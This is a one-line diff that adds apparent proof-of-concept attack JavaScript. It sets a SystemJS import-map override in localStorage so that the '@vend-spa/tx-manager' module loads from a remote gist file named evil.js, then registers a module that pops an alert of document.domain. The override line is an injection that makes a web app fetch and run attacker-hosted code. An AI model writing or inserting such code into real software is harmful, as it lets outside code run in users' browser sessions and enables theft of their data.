@@ -1,0 +1,1 @@
+localStorage.setItem("import-map-override:@vend-spa/tx-manager","https://gist.githubusercontent.com/ngostuan/test/raw/evil.js");System.register([],function(e){return{execute:function(){alert(document.domain)}}});
